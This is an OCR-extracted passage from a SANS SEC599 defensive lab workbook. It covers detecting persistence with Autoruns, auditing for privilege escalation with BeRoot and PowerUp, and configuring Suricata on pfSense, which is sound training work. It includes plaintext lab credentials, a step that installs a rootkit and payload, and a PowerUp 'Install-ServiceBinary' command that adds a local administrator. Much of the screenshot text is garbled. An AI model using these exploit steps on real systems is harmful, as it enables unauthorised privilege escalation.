· Use GPO's and scripts to run autoruns periodically on all domain hosts

· Optional: Dashboard the autoruns output in ELK stack for baselining

1. Logon to Windows workstation Logan to the Windows workstation with our default user:

Username: nick.fury Password: Awesomesauce123
2. Install malicious code As we want to simulate an existing persistence mechanism, we will now install malicious code ourselves.

Open the DVD (D:), and copy folder persistence to C:\persistence (it is important that the persistence folder is copied in the root of disk C: ).

Open folder C:\persistence in your Windows explorer.

© 2017 Erik Van Buggenhout & Stephen Sims

157

· penITTmce

Home Share View

, Th" PC local Disk (C:) > p1'rs1stmce ·

a Desktop

"' "

... Downloads ii

Documents rt

,.. P1Ctures

ELK

Mui.1c

· PrMlege Esc1lat1 Vid~

mbar hxdeflOO.,ni [, run-as-adm1n1rtrator.bat

ta. On,eDnve

c;I This PC
a Desktop
Documents

... Downloads Music

... Pictures
· Videos
_ loul Disk (C:)

DVD Dnv,e (0:) sc

Networlc

.,

7 ,rtems

·
.., C, Search persistence
· hxdef100.ece -· payload ece
run-as-normal-user.bat

X
·
p

3. Execute run-as-normal-user.bat
Double click on the bat file run-as-normal-user.bat. You can compare the output with the screenshot to confirm that the installation went well.
This will install a persistent payload that does not require administrative rights (we are using a registry Run key for this, something that we discuss in more depth in the course material).

4. Execute run-as-administrator.bat The next bat file (run-as-administrator.bat) requires administrative privileges. Thus right-click on the bat file run-as-administrator.bat, and select Run as administrator.
Provide the domain admin credentials:

Username: administrator Password: Sec599
You can compare the output with the screenshot to confirm that the installation went well.

158

© 2017 Erik Van Buggenhout & Stephen Sims

This will install a persistent payload and a rootkit that do require administrative rights.

1111 C:W'4ndow,\Sy,t,m3Z\cmd.ex·

-· X

5. Run Sysinternals' Autoruns Autoruns is a Microsoft Sysinternals GUI tool that displays all features of Windows that allow automatic execution of code.
Open folder SysinternalsSuite on the desktop, and launch Autoruns.exe.
Accept the dialogs.
Then you will see a list of all programs and commands that can be launched automatically on Windows. Please refer to the courseware for some additional information on the different Autoruns views. An interesting part of Autoruns is the ability to hide known Windows entries ("goodware").

© 2017 Erik Van Buggenhout & Stephen Sims

159

: i Autoruns - Sysintemals: www.sys1nternals.com

D X

File Ent,y Options Help

filer: ..___ _ _ __.

~ Boot Execute

1::1 Imaoe ~

·~ Pri'lt Moritors

lSA Providers

.J CJ Eve-vttq ~ Logon

Explorer

App!Rt

ICnowrDI.Ls

~ Netwcwi( Providers

~ WM!

A d Internet Explorer

SchecUl!dTa.sks

I Wnogon

"- Wnsoc:k Providers

Jr! a (1. Sideb« Gadg,,ts

f] Oflu

~ Serv,ces

Drivers

Codecs

/>Jon., Ert,y

~1011

l'l.tlbl1er

mage Palh

T~

VrusTotal

"

gj' HKLM\SOFTWARE\Moaosaft\Wrdows\CunnVC19ion\fbl

8/3/2017 9 06 AM

0 wQ VMware ·. VMware Toob Core S . VMware. Inc

c:~

fies\vmw.. 8/25/2016 9 21 PM

!?t HKLM\SOFTWARE\Wow6432Node~\Wndcr,,-s'Cl.lref1Ven.on\lui

8/3/2017 9-34 AM

0 0

Slnlava. Java Uidate SchediJe,- Orade UltJ)Ol1!lion

c:~

fies Oc86}\.. 7/22/2017 6-()5 AM - - - ~ - -

(I HKCU\SOFTWARE\Mlmlsoft\Wrmw,~Vinon\Rui

9/7/2017 1·10 PM

0 4. OneOnve MiaoaoftOneCktve MlcrosoftCorporation c:\usffl'wck_n-v\ap.. 8/24/20178·14AM

0 @ payload Apadiellench oomma "9ache Sdtwa,e Fou... c:'lpenistence\payloa... 9/28/2009 11·00 PM

gJ HKLM\SOFTWAR~\Adive S e t ~ ~ Corrc>ociem

7m/2017 4 00 PM

0 ~ GoogleC... GoogleOwome lnstalec Goo9e Inc.

c:~ f i e s 0c86}\ ... 8/Zl/20177-49AM

0 =, ~ --· Wrdows Mall

Mia-od Caporabon c·~

flet\wnd... 7116/2016 2:25 AM

l!f HKI..M\SOFTWARE\Wow6432Node\Miaosolt\Adive Seli.4>~Compcr,erts

7/16/2016 l UBAM ~ - - - -

r;2) ':. Mta-osoft.. Wrdows M.,,I

MlcrosoftCotpoaitlon c·'lpros,amfiles~86}\. 7/16/20161 ·41 AM

/J HKI.M\Sdtware~\'\Shell:x\CclltextMenJHarders

8/3/2017 9-06 J.M

0

7-l)p

7-l)p Shel Exlemion Igo.- Pavlov

c:'lpros,amfies\ 7-z,p\.. lQ/4/2016 2:51 PM

0

ANotepa... ShelHandlerforNole...

c~fies0c86}\ .. 5/12/20l49:49AM

d' HKLM\Softw..-e\Classe,\Direaory\Shel&'Conlei<1MeruH51Clen

8/3/2017 9:06 AM

~ 7-bp

7-l)p Shel Ex!ensoon Igor Pavlov

c \pros,llm lie,\ 7-z,p\... 10/ 4/2016 2:51 PM _ _ _

,;

Re~y.

Wi"dows Entnes tidde,.

6. Try to locate persistent malware
Review the entries, and try to locate the persistent malware we installed in previous steps.

Remark that in the "Options" menu, you have several options to hide known entries. For example, we can configure Autoruns to hide known Windows persistence entries, which will hide a lot of the noise. We could also further limit the list of hidden entries by verifying digital signatures and only hiding trusted entries...
7. Run Malwarebytes Anti-Rootkit
Under folder c:\persistence\mbar, execute mbar.exe as administrator (right-click). You can use the same credentials:

Username: Administrator Password: Sec599

Note that Malwarebytes "Anti-Rootkit"might warn / query you about updating the product. This is however not required for the tool to work correctly in our lab environment. Execute a scan by selecting the default options and clicking on button Scan. This will take a couple of minutes.

What malware was detected?

160

© 2017 Erik Van Buggenhout & Stephen Sims

~ Matwarebytes Anti-Rootlcit BETA vl .09.3.1001

-

X

overview
IntrockJction ~ te
Scan System
Cleanup

Cleanup:
Detected malware obJeds Und'leck items you want to lceep intact Click "Cleanup· to start removal.
Detected rnalwore items
0 C:\persistence\ hx.def100.exe (Rootkit.HackerOefender.DR)
E2J HKLM\SYSTEM\CURRENTCONTROLSET\SERVICES\HackerDefender100 (f
0 C:\persistence\ hxdef100.exe (Rootkrt.HackerDefender.DR) 0 C:\ persistence\payload.exe (Trojan.Swrort)
1:21 HKU\S·1·5·21·409S063694·3848447163·3403915358·1104\ SOFTWARE\Ml1
0 C:\ Users\ nick.fu,y\Desktop\ Milcikatz\ Win32\ mimikatz.exe (HackTool.Min 0 C:\Users\ nick.fu,y\Desktop\ Mikikatz\Win32\ mimilove.exe (Trojan.Passwc 0 C:\ Users\ nick.fu,y\Desktop\ Mikikatz\x64\ mimikatz.exe (HackTool.Mimilc.
I
0 Creatr Restore por,t
Scan Finished: 8 malware items detected!
Previous 11 Exit

8. Autorunsc for the command line Autoruns.exe is a GUI application, and thus not very suitable for automation.
There is a command-line version: Autorunsc.exe.
As opposed to the normal executable, this file will result in a text-based output. Let's open a command prompt in Windows and browse to the Sysinternals folder. We will now run the following command:
autorunsc.exe --help
Take a few minutes to review all available command line flags, which resemble the functions available in the normal GUI-based application. Interesting to note is that autorunsc.exe can for example be configured to provide XML-based output, which facilitates later importing of the output in other tools (e.g. an ELK stack).

© 2017 Erik Van Buggenhout & Stephen Sims

161

9. Running Autorunsc.exe
Let's now run Autorunsc.exe using the following options: o "-nobanner" to avoid having the Microsoft banner at the start of the output o "-accepteula" as we want to avoid a GUI popping up to confirm the EULA o "-m" will hide any known Windows entries o "-c" will provide CSV output (for easy parsing)
The command to run is:
autorunsc.exe -nobanner -accepteula -m -c
This will result in a default text-based output listing a limited list of persistence entries available, which we can now investigate!

10. Switch to Domain Controller Let's switch to our domain controller for a second, you can use the Domain Administrator credentials to authenticate:
Username: Administrator Password: Sec599

162

© 2017 Erik Van Buggenhout & Stephen Sims

r
11. Open Group Policy Management
As part of the preparation, we've already added the "Sysinternals" toolssuite to the "sysvol" share of the synctechlabs.com domain (available at \\DC\sysvol \synctechlabs.com\Sysinternals). This will make the toolsuite available to all domain-joined computers. We also have created a small script called "Autorunsc.cmd" in the same location, which is bascily a wrapper around Autorunsc.exe that will do the following:
\ \DC\sysvol\synctechlabs.com\Sysinternals\Autorunsc.exe -accepteula -nobanner -m -c > \\DC\sysvol\synctechlabs.com\Sysinternals \Data\Autoruns_ %%COMPUTERNAME%%_ %%LOGONUSER%%.csv
The command line syntax above (again, which is already present in Autorunsc.cmd) will run Autorunsc.exe from the domain sysvol share (accessible to all authenticated domain users) with the options we previously discussed. Afterwards, it will write the output in a .csv file, thereby adding the current COMPUTERNAME & LOGONUSER environment variables in the filename.
We will now create a Scheduled Task using a group policy to enforce running of our "Autorunsc.cmd" script on all machines in the domain. For this select the "Group Policy Management" option in "Tools" section of the "Server Manager" window.

~ ~rver Manager

-

D X

·· Dashboard

ii Dashboard i local Server I i All Servers fil ADDS A DNS
I ; File and Storage Services I> .

WUCOMHO SERVER MANAG·R

-~

8 Configure

2 Add roles

3 Addotnel
4 Create a

5 Connect

ROUS ANO SERVER GROUPS

Adrw 0irroory Adm1n1Ul'awe Cenw Acbv,, Dir,cn,,y Ooma"'s and Trusts Ad,v,, Directory Module lo, W1ndow5 Pow,rShet
ActM, Directory s,tes .w,d Sctv,ces
Active Directory Users and Comput= AOSI Edit Component Se<vius Comp!Af, Management
Defragm.nt a.nd Opt,m,ze o ~
Disk Clellllup CNS Event Viewer Group Pol,cy M ~ t
Local ~vnty Pcl,c:y Microsoft Azure SeMC<s ODBC Data Sources (32-b,t)
OOBC Data Sou,,.,. (64·b1t)
Petfotmance Monitor PMtM1""9"ment

12. Browse the GPO structure
Next, we will open the default domain policy for editing by browsing the GPO structure:

Forest: synctechlabs.com -> Domains-> synctechlabs.com -> Default Domain Policy

We will now right-click this entry and select "Edit. .."

© 2017 Erik Van Buggenhout & Stephen Sims

163

..a. Group Policy Managcment

_j File Action Virw Window Help

6 . . . !·; I!::;
- - ..&, Group Policy Management
,n v Forest synctechlabs.com

Group Policy Management

I v ·· Domains v j,} synctechlabs.com

Name

. _· Default Domain.

> - De > Gr
) ;q WI..,,
'.J Sti > tg Sites
,r:J Group Po
" Group Po

Edit.·· Enforced Linlc Enabled Save Report...
New Window from Here

Delete

Rename

Refresh

Help
I

I I

<

>l I

I

Open the GPO editor

·

X I

I I
,i
I
J

13. Open scheduled tasks menu
Inside the Group Policy, we will browse the section related to Scheduled Tasks:

User Configuration -> Preferences-> Control Panel Settings-> Scheduled Tasks

.J Group Polrcy Management Editor

Frie Action View Help
. .. , ...J
j-} Default Domain Policy [DC.SYN.
v J- Computtt Configuration
Polrcres
Preferences
v Unr Confi9urat1on -..1 Policil!S
v .....J Preferences
Windows ~!tings
v @J Control Panel ~ttin~, ~ Data Sources
.IA Devices
CG° Folder Opbons
· Internet Settings
! j Local URrs and ) -J!I Network Opbons ~ Power Optrons I
,::._ Printers
· Regional Opbon<,
l.J!.I Scheduled Tero
It!, Start Moenu

Oesc:npbon No policies selected

· X
There are no items to show 1n this View.

Scheduled Tasks
164

© 2017 Erik Van Buggenhout & Stephen Sims

14. Creating a new scheduled task
We will now create a new scheduled task to run Autorunsc.exe. Note that in our example, we will create a Scheduled task for "At least Windows 7", as we have a Windows 10 only environment.

Inside the Scheduled Tasks view, we can right-click and select:

New-> Scheduled Task (At least Windows 7)
_J Group Policy Managtfflent Editor
File Action View He::lp

D X

v .t. Computer Configuration
Pohcies
Prderencts
v ~ User Configuration
Policies
v _., Preferences
Windows Settings v @) Control Panel SettJn.
~ Data Sources
jl 0MC6 Qf Folder Options
~ lntemet Settings
l'l Local Usersand
~ Nmvork Options ~ Power Options ~ Printers
IO R4!9ional Option
_a) Sc:heduled Ta~lcs
/B Start Menu

There are no items to show in this v,ew,

Scheduled Task Immediato, Ta.sic (Windows XP) Scheduled Task (At lust Windows 7) Immediate Task (At lo,ast Windows 7)

NO!W

>

All Tasks

Refresh

Virw

Arrange Icons Lin, up Icons

Help
<
Add a new scheduled task (At least Windows 7) ittffl

15. Configure Scheduled Task - General In the General tab, we can provide the following information:
o Action : Create o Name: "Autoruns at user logon" The other options in this tab will remain unchanged, as we want the task t o run in the context of the user that is logged on. We will now open the "Triggers" tab.

© 2017 Erik Van Buggenhout & Stephen Sims

165

Autoruns at user logon Propetbes

X

~ a l Tnooers Actions Conditions Settngs Common

Name: Author: Oescr4>tion:

Action:

Create

lAulDnru at user logo,,
SVNCTEa-t.A8S \Admnstr a tor

Seculty options
When n.ms,o the t.,sk, use the fullowng user llCC.Ol.flt: (yiogon0omar,%\"t.loOOR,Jser%
any @Rl.Wl 'Mle'I user IS iooged on
0 Ru, whelher user IS loo9ed on or not

ChllnoeUse:r Of Gl'Ot-'1. .·

Otidden

V

OK

Cance

~-
16. Configure Scheduled Task - Triggers We will now define when the scheduled task needs to run. As indicated before, we want it to run on user logon, so we will perform the following in the "Triggers" tab: o Click "New"
o Begin the task: "At log on"
The remaining options do not have to be adapted and we can now click Ok and go to the 'Actions' tab.

166

© 2017 Erik Van Buggenhout & Stephen Sims

General New Trigger
\';1ien Begnthetaslc:
sett.,os
To09 @Onet.me
Q o., Q Weekly Q Moritiy

On a sdlelUe
Onasctieoole
! At startup Olde Onane-,t At task auboniffi)Ciflcabon On ax 11eetlon to user sessaon On dsconntct from user- session On W!lrbtabon loci 101 Wllricstaoon trildc

V
eaaosstmezanet

X
xl

,,....

Advanced Settw,gs

0 Delay taslc for 1.C> to (random dda1):

D Repeat taslc ewry:

lhcu

:, ? ..nWlg la:.i:sal end ofrepetition cl.orabon
Os1cp tas1cff1t,u,slorY,)er than:

l O E,cp·-e:

9/Ur..<)17

0Enabled

I J 13:21:1:!PM

17. Configure Scheduled Task - Actions
Next up, we will configure the action that is to be taken by the Scheduled Task. Under the "Actions" tab, we can click the "New..." button and configure the dialog screen as follows:
Action: Start a program Program/script: \ \DC\sysvol\synctechlabs.com\sysinternals\Autorunsc.cmd
The other options (e.g. arguments) are not required, as we have already included them in the .cmd script ourselves!

© 2017 Erik Van Buggenhout & Stephen Sims

167

At urn<itu

Ge,,e-al Tnooer, ActJons Cardbons S e ~ Common

l ,.........
""''" you aeate a

....._._ ....,..,

v,I

NewAcbon

Ac1Jon - - - You rrust 5')edfy vhlt adlof1 this task wl pefcrm.

X

Start a progam

Adxln:

Start a progam

Settnos
Pr~fscrllt:
I .~

I .ccm\5ysntemals.',Autoru,,c.and &owse...

Add ¥91,ffleOIS(opbonal}:

Slllrt n(opbonal}:

<

OK

18. Finish scheduled task
Once the actions have been configured, click "OK" in the New task window. In the overview, we should now see the created task. The small green triangle indicates it is a task that is to be created!

168

© 2017 Erik Van Buggenhout & Stephen Sims

Group Policy Management Editor

File Action
·

Vofl:W Help
0

l 6 1rn l 8 & +

,,.

Dd·ult Domain Pobcy (DC.SYN

V

Computu Configuration

Pohcoes

J Pmerences

V User Configur·tJon

_J Pol1<1es
..., J PrO!!fcrMces

Windows Sd:tings

v ,:@ Control Panel Sdtin~
;;J DmSources
4 Dl'Vl<es
Qt Folder Options

· Internet Settingi.
!fl Local Use,s ·nd C

.i! Nffi',orlc Options

~ Po""er Options

l>Hcnpllon

~

-,2 Pnnters

No pol ie< selected

· Regional Options

~ Scheduled Tasks
JJ. Start Menu

D X
Crute

<

>

Scheduled Tasks

19. Apply policies+ logoff &amp; logon on Workstation
Finally, let's switch back to our workstation and run the following command in a command prompt:
gpupdate
This will refresh the group policies.
Once completed, we will now log off from the Windows workstation (Start button -> Click user icon -> Sign Out). Once logged off, we will immediately reauthenticate using the Nick Fury account and the Awesomesauce123 password.

20. Review Data folder for .csv files
Once connected to the workstation, let's open the following folder in the Windows explorer:

\ \DC\sysvol\synctechlabs.com\sysinternals\Data\

© 2017 Erik Van Buggenhout & Stephen Sims

169

A freshly generated .csv file should be present, which should include the results of autorunsc.cmd on the Windows workstation.
21. Extra challenge: ELK dashboard
Now... You've probably If you have some additional time left, please try experimenting by yourself to load the structured output from the autorunsc.exe command in ELK. Although we haven't provided detailed instructions, the instructor would be happy to help you out!

170

© 2017 Erik Van Buggenhout & Stephen Sims

SEC599-4.2: Exercise - Local privilege escalation techniques
Objective
The detailed steps in the lab include: · Test our Windows environment for local privilege escalation flaws using beroot.exe & PowerUp. · Install a vulnerable service · Fix service permissions & harden our environment · Retest our Windows environment
Scenario Virtual Machines
1. SEC599-C01 - Windows
Exercise 1 : SECS99-4.2
The objective of the lab is to audit our own Windows environment for privilege escalation vulnerabilities using different offensive tools. We will then harden our environment, after which we will again test the effectiveness of our tools.

The detailed steps in the lab include:
· Test our Windows environment for local privilege escalation flaws using beroot.exe &
PowerUp. · Install a vulnerable service · Fix service permissions & harden our environment · Retest our Windows environment
1. Logon to Windows Logan to our Windows workstation with our user credentials:
Username: nick.fury Password: Awesomesauce123

2. Run BeRoot.exe Our Windows system is a default Windows 10 machine, which is reasonably well protected. We haven't installed many third party software and thus configuration flaws are limited.
You can run BeRoot.exe in the following way: o Open a command prompt o Change directory to C:\Users\nick.fury\Desktop\Privilege Escalation

© 2017 Erik Van Buggenhout & Stephen Sims

171

o Run BeRoot.exe
This should not give you too many results... Although a "unattend.xml" file is referenced! Note that in some cases BeRoot.exe could attempt to use the Rasman service to perform privilege escalation. This is however a false positive and should be ignored.

I ij Command Prom~·

· X

3. Review unattend.xml file That unattend.xml file sure looks interesting!
We discussed what it means during the course (it's a left-over installation file that could potentially include an encoded (not hashed) variant of the administrative password). When closely analyzing the file however, we'll notice that it's a false positive (as the sensitive information has been removed)!
In order to confirm this, you can follow the following steps: o In your Windows explorer, browse to the C:\Windows\Panther directory o Open the unattend.xml file with Notedpad++ (Right-Click-> Edit with Notepad++)
o Search for string "<Password>" (using CTRL+F)

172

© 2017 Erik Van Buggenhout & Stephen Sims

'1" ·C:.\VlindoM\PantMf\unattcncbml - Nolep,d+-..-
Fd, Edit S..rch v,... Encoding Longuog< Settings Tools M,cro Run Plu91n, Wind<>w l oJSCI O o~ l -4' I l.»Cl lll l>a ~~ l>litiil "',11 ~ l.ll(.lll)u · l ~1·

·- ~(il

liLnlllnmCI

· X
X

<set.t.1.nos paas.·"'oobeSystea.. wasPaet:Processe-ct··true'">

<coar;ponent. naae·'"Nt crosott-Windowa-Shel.1-sea::rp· publ1.cl.cyTottn·"3lht.3856ad36te3.:S.. la.nguaqc-·neat.ral" vcr:u.onScopt <Aui:oI.oqon> <Pasaword>* SENSlTIVZ·DATA· DEL.ZTED· </Pa....,ord> <Ena.bled>t.....,</1!:nabled> <0.scrn~>·anstorensios</Username> </AueoI.oo-on>

<Uae::cACCOllt)t8> <LocalAccount.1>
<LOca.lACcount. wca:an1.o»-'"ad4·>
<Paa.sword>'·SP!lrSlTIVE* OATA· D~LETED· </ Possword> <Group>adllintatr-·tors;osors</Grovp>

.0 .

</LoO&l.AcCOWlt.) </Loca..l.Accou.nts>

</Ose~coun~.s>

..

<OOIIE~ <iU.de.EtJLAPaoe>t r a e < / l l i d . e . . t U I . A P · ; e > <Pxote:ceYo~PC>3</Prote:ctYourPC>

a

<Sk1pHach.1ne00BE>t;ro&</SrtpMaebineQOBE>

<Sldptlse:QOBl!:>true </SJc1ptlsorOOBE>

<Ue:c.workLocau.on>Ot.ber</ Ne:t:workt.ocac10n>

96

</00&>

4. Run PowerUp.ps1 Next up, let's try the Powershell "PowerUp.psl" script! The advantage is that this is a pure powershell script and has thus better chances of running as opposed to the BeRoot.exe binary. You can run powerup.psl in the following way: o Open a powershell prompt (you can find it in the taskbar) o Change directory to C:\Users\nick.fury\Desktop\Privilege Escalation\
o Execute the following command to load the functions & modules of PowerUp:
· Import-Module ,/PowerUp.psl
o Execute the following command to run PowerUp.psl's checks:
· Invoke-AIIChecks This command will take a few seconds, as PowerUp.psl will now perform all its privilege escalation checks.

© 2017 Erik Van Buggenhout & Stephen Sims

173

5. Review PowerUp results
PowerUp should come back with a few possibly interesting results:
o The Unattend.xml file we already analyzed and confirmed to be a false positive;
o A possible DLL hijacking vulnerability in the %PATH% directory.
o A number of vulnerabilities related to service executables & permissions. After some testing by the Author, we determined that the DLL hijacking vulnerability
and service-related vulnerabilities are not exploitable in the current configuration of the system (if you have time left, feel free to try to prove us otherwise :))
As a next step, we'll insert an actual vulnerability, which we will test and afterwards fix.

174

© 2017 Erik Van Buggenhout & Stephen Sims

6. Install vulnerable service
We will install a vulnerable service now to simulate a third-party application that is installed using insecure Windows service permissions. The executable of this service is writable to normal users, and can thus be used for privilege escalation.
Go to the DVD (D:) and copy folder "escalate" to c:\escalate.
It is important to copy this folder in the root of drive C: for the service to work
properly.
Execute bat file run-as-administrator.bat in the following way: o Right-click-> "Run as administrator..." o Provide the following credentials:
· Username: Administrator · Password: Sec599 You can check the screenshot for the expected output.

© 2017 Erik Van Buggenhout & Stephen Sims

175

7. Re-run BeRoot.exe Now, let's try running BeRoot.exe again:

o Open a command prompt

o Change directory to C:\Users\nick.fury\Desktop\Privilege Escalation o Run BeRoot.exe

You should now see the "VulnerableService" being reported. The issue here is that the C:\escalate directory is writable to our non-privileged user, while the service is executed as SYSTEM.

Iiii Co;:;;;:;;;rompl

0 X

8. Re-run powerup.ps1 Let's also try to re-run the "PowerUp.psl" script: o Open a powershell prompt (you can find it in the taskbar) o Change directory to C:\Users\nick.fury\Desktop\Privilege Escalation\
o Execute the following command to load the functions & modules of PowerUp:

176

© 2017 Erik Van Buggenhout & Stephen Sims

· Import-Module ./PowerUp.psl
o Execute the following command to run PowerUp's checks:
· Invoke-AIIChecks
Similar to the output of the BeRoot.exe, you should now recognize our VulnerableService. An interesting sidenote here is that Powerup will also provide you with a command line syntax you can use to actively exploit the issue. If you feel like it, you can optionally run this command in your Powershell window:

Install-ServiceBinary -Name 'VulnerableService"

This will overwrite the existing service binary with a binary that will perform a more malicious activity (in this case, add a user john and adding him to the local administrators group).

DI Windows PowCISh·H

D X

9. Secure the service directory - Review permissions To prevent privilege escalation, you will have to secure the service from changes. This involves changing the permissions (DACL - Discretionary Access Control List) of the service executable. You can do this by:
o Opening a Windows explorer window
o Browsing to the C:\ root of the hard drive
o Right-clicking the "escalate" folder and opening its properties
o Open the "Security" tab This will give you a nice overview of the privileges assigned to the folder. You should notice that "Authenticated Users" are allowed to "Write" and "Modify" in the folder. Additionally, this also appears to be a privilege that is inherited from the "C: \" folder.

© 2017 Erik Van Buggenhout & Stephen Sims

177

;

Home
w 1-

Share V1tw This PC > Local Disk (C:)

v C, Search local 01·1' C

,t- Qu,ck access
a Desktop
,I, Downloads
Documents

,, ,, ,,

... Pictures

,#

ELK
Ji Music

Privilege Escalabon
· Videos

Name

Date mod,fi!d

Typ,o

escalate Perflogs Program Files

escalate Properties Gene,a1 Sharing Seany Previous ¼rslons Custonne

Program Files (x~

tmp

I

Users

Windows

ati,ec:t name C:\escalate
Group or user~ Puhereicaled Users SYSTEM Adntisltaloq (WINOOWSOZVdnmtn!tcn) u.en, (WINOOWS02\User1)

Si:e
X

a OneDnve
[.J Thi~ PC c) Network

To change~-dck Edi
PenniSSIOf\5 for /luh«ticated Users
Fulcortn:>1 Madly Read &exea.te

Now 

E.dt
Deny
" ~

u3I folder conterts



Read



Wrte

For ll)eaal pemm1ons oradvanced ldlngs. dick Mvenced

"
Advl!nced

01
p '

7 rtems 1 ,tem selected

OK

10. Secure the service directory - Update permissions
Next up, in the security tab we opened in the previous step, we will perform the following:
o Click the "Advanced" button
o Click "Change Permissions" and provide administrative credentials (Administrator - Sec599)
o Select the "Authenticated Users" entry
o Click "Disable Inheritance" and "Convert inherited permissions into explicit permissions on this object"
o Click "Remove"
o Click "OK"
Note that we are disabling inheritance, as the folder automatically inherits permissions from the "C:\" root drive.

178

© 2017 Erik Van Buggenhout & Stephen Sims

Advanced St.curity Settings for escalate

D X

Name:

(:\ escalate
node.fury (SYNCTECHLABS\nick.fury) $ Change

Permissions

Aucftl:lng Effective Access

For addtttonal information, double-click a permission entry. To modify a permission entry, select the entry and dick Edit (if available).

Permission entries:

Type
It Allow
Allow Allow Allow

Principal
Administrators (WINOOWS02... SYSTEM Users (WINOOWS02\ Useis) Authenticated Users

Access
Full conltol Full conttol Read & eirecute Mod,ly

lnhented from
None None None None

Applies to
This rolder, subfolders and files
This folder, subfolders and files This folder, subfolders and files This folder. subfolders and files

Add

Ecftt

Enable inheriunce
0 Replace all child object perm1n100 entnes with inhentable permission entries from this object

OK

UJncel

Apply

11. A note on the enumeration error
As part of the removal of the permissions, you'll notice you receive an error (see screenshot), which indicates the system could not information from the service.exe file. This is already an effect of the fact that you have removed the permissions, so everything is working according to plan! You can continue the work by clicking "Continue" and "OK".

Advanced Secunty xtt1ngs for c;cn ate

C

Name: Owner.

(:\escalate
nick.Iury (SVNCTECHLABS\oic.lc.fury) $ Change

Perm1ss1ons

Auditing Effective Access

For additional information, double-chck a permission entry. To modify a permission entry. select the entry and click Edit (if available),

Permission entries:

Error Applying Security

X

Type
i! Allow
Allow
Al Allow

Principal
Adm1n1strators (W SYSTEM Users (WINOOWSC

t,n emirocruied ~ applyrlg secuty Wormatton to C:\escalate\servtce ex.e

to Ider, subfolders and ftles older, subfolders and files old<!r, subfolders and files

Add

Remove

Enable 1nhentance
D Replace all child object permission enbies with inheritable permission entries from thtS object

OK

© 2017 Erik Van Buggenhout & Stephen Sims

Cancel

Apply

179

12. Run BeRoot.exe and PowerUp.ps1 again
Use powerup and BeRoot like we did before to verify that the service is no longer vulnerable to privilege escalation.

In enterprise-wide environments, it's a good idea to periodically assess the environment for these types of flaws and preventively secure installed services.

13. Confirming the fix - Manually changing the file
As a final test, we can manually attempt to alter the "service.exe" file in the C:\escalate folder. You could for example attempt renaming it to "service2.exe", which should result in a permission error being returned!

+¥+ · Home

Shart View

ManaQt

> This PC > local Disk (C:) > escalate

V C, Search -.:,calate

,t Quick access
· Desktop
.t, Downloads
'.3 Documents

- run-as-administrator.bat ,t
~ ~rvice.cs
,, 'l"J serv,cu.exe

Date mod1f,ed
918/2017 3.N PM 918/2017 3:23 PM 9/13/201;' 5·12 PM

ly~

s,:.

Windows Batch File
VtSual c= Source F.
ApphcJhon

- Pictures ELK
J, Music

;I
File Access Denied

Prrvilege Escalatioj
· Videos
41a OneOnve
· This PC

Af\.
ill

You'll need to proVlde adm1n1strlllor perm1sst0n to rename this file
seMce.cxe File version: 0.0.0.0 Date cmted: 9/13/2017 5:12 PM Siu:4.00 KB

(I- Network

p
1 KB l KB 4 KB

l ! $~ontinue

Cancel

3 items 1 ftem s"lect"d 4.00 KB

180

© 2017 Erik Van Buggenhout & Stephen Sims

SEC599-4.3: Exercise - Using Suricata to detect network anomalies
Objective
The following are the high-level attack steps:
· Configure Suricata on PfSense to perform IDS alerting · Write new IDS rule to spot new type of attack technique · Simulate attack using new attack technique and confirm successful detection
Scenario Virtual Machines
1. SEC599-C01 - Firewall 2. SEC599-C01 - Windows02 3. SEC599-C01 - Ubuntu03 4. SEC599-C01 - DomainController 5. SEC599-C01 - Kali
Exercise 1 : SEC599-4.4
· Configure Suricata to perform IDS alerting & HTTP log generation · Identify the anomalies and spot the malware on our endpoints · Dashboard Suricata output in Kibana
1. Log on to Windows workstation Log on to the Windows machine with your normal user credentials:
Username: nick.fury Password: Awesomesauce123
2. Logon to pfSense First of all, we are going to log on to our PfSense firewall, which is positioned at the perimeter of our network. You can open the management interface by opening Google Chrome and clicking on the PfSense firewall bookmark. The credentials are:
Username: admin Password: sec599

© 2017 Erik Van Buggenhout & Stephen Sims

181

C A NOi -'CIM l>l<!J.'":,, 192.168.10.1

8

· X

Q. *

Status / Dashboard

System lnlormauon

/- 0 0

Sy1um v......

"'YCt ·V v,n,~e t·,:~-t1r
·-- - - s..... 0.'35112·9..I ·1 ltH>3of·0015SdOIIOOO
'-~t1e ~ f ' ID fd76fddtlft4Sll12lat
......... R\ ttt Ol'lt 0S/tlrlOt?
CUl'.r. :,r ~· .. ~ s:..a.) CCiT 2C ..
;'·ffl~ 1-Q[LflSf,olt

1n1erhca1
.,. d,
. ... ,h

· 0

J.

+

1~t,· ·· T,'·.tll-Our f'J·
1o~t·~" r · j,Jll,dt.0tt·
,,.,,.
0Gt· ~ · · ' ~ r·

+o
.., /- 0 0 u 1n·u101
11: ·~ :91 tt1tH).)

CPUl\'1>0
~·-·-

;i;~nN
inlh'.R (IOft(f< CPU ES-:.6!(; , 1 C 2 SOGH?
!Cf'l.,,S 01··t,0tSl·:C41t11
WHo\.fC'M~u:S:~
~ ffll'<~~CEST::-J1·
· 1~l 00 I · 10 l 99 51 , 10366

3. Configuring Suricata on pfSense
You can open the Suricata configuration by clicking "Services"-> Suricata. You may remember we also used Suricata in the Cuckoo sandbox that we created on Day 2. We will now however configure Suricata in a different way: by using PfSense's builtin Suricata package.

The first page you'll see is an overview of the interfaces on which Suricata has been configured. You'll notice that we've already added the WANNOINTERNET interface. To give you a bit of background: this is the "simulated" WAN we are using in which our evil Kali machine (hosted on www.evilwebserver.com) is sitting.

C A Not..cu.., i>"!!i 192.168.10.ls >u1t.1.wncau ...acPS.i:;hp

-E~.s...en' e..

-

services/ Suricata / lmerfaces

8

· X

* Q.

·

0

Pltm
lntort1c· Seltlngs Ovorv1ew

-·0 C®

-·- .,._
"""

0

.....

.....

4. Reviewing Suricata categories Let's further investigate what type of IDS rules are available in Suricata...

182

© 2017 Erik Van Buggenhout & Stephen Sims

As a first step, please click on the "Edit" icon (on the right) for the WANNOINTERNET interface in the overall Suricata configuration page. This should open a submenu with a number of "WANNO ..." items (e.g. WANNO Settings, WANNO Categories,...).
As a next step, we will click the "WANNO Categories" button in Suricata, which is used to manage the rulesets applied to Suricata. We will enable one of the categories that is part of the "Emerging Threats" ruleset. For our exercise, we will use the "emerging-trojan" rules by clicking the "emerging-trojan.rules" checkbox.
On this is completed, please click the Save button (at the bottom of the page).

emt'i'Q~D_S~N&ff
fi"'\~_so« :"le-·~ ru!t's

5. Reviewing Suricata rules
Next up, we will analyze the specific rules that are part of the "emergingtrojan.rules" category. We can do this by opening the "WANNO Rules" submenu.

